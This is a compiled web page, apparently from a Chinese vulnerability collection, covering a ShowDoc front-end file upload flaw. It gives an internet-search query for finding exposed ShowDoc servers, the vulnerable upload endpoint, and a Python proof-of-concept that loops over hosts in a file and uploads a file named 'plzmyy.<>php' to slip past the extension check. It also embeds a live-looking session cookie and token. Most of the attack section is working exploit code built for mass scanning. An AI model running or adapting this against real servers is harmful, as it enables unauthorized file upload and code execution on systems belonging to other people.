import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c as p,a as n,b as s,d as i,e as c}from"./app-58e4a7d6.js";const u={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"参考链接：",-1),d={href:"https://github.com/star7th/showdoc/pull/1059",target:"_blank",rel:"noopener noreferrer"},k=c(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ShowDoc&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /server/index.php?s=/home/page/uploading HTTP/1.1
上传图片，并抓包，将文件名改为plzmyy.&lt;&gt;php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

test <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;url.txt&#39;</span><span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> host <span class="token keyword">in</span> test<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> host<span class="token operator">+</span><span class="token string">&quot;/server/index.php?s=/home/page/uploading&quot;</span>
    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;------WebKitFormBoundary5j2IsrTFPjJCVtwU
    Content - Disposition: form - data;name = &quot;editormd-image-file&quot;;filename = &quot;plzmyy.&lt;&gt;php&quot;
    Content - Type: text / plain

    123123test
    ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -&quot;&quot;&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;PHPSESSID=shp3gipo9moaj58kp9n8sbi4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Sec-Fetch-Site&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;same-origin&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Sec-Fetch-Dest&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;iframe&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Sec-Fetch-Mode&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;navigate&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;sec-ch-ua&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;\\&quot;Google Chrome\\&quot;;v=\\&quot;87\\&quot;, \\&quot; Not;A Brand\\&quot;;v=\\&quot;99\\&quot;, \\&quot;Chromium\\&quot;;v=\\&quot;87\\&quot;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;sec-ch-ua-mobile&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;?0&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Cache-Control&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;max-age=0&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Upgrade-Insecure-Requests&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Content-Length&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;212&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;multipart/form-data; boundary=----WebKitFormBoundary5j2IsrTFPjJCVtwU&quot;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

    <span class="token keyword">if</span> response<span class="token punctuation">.</span>text <span class="token keyword">in</span> <span class="token string">&#39;success&#39;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function v(q,m){const a=e("ExternalLinkIcon");return o(),p("div",null,[l,r,n("ul",null,[n("li",null,[n("a",d,[s("https://github.com/star7th/showdoc/pull/1059"),i(a)])])]),k])}const h=t(u,[["render",v],["__file","ShowDoc 前台文件上传漏洞.html.vue"]]);export{h as default};
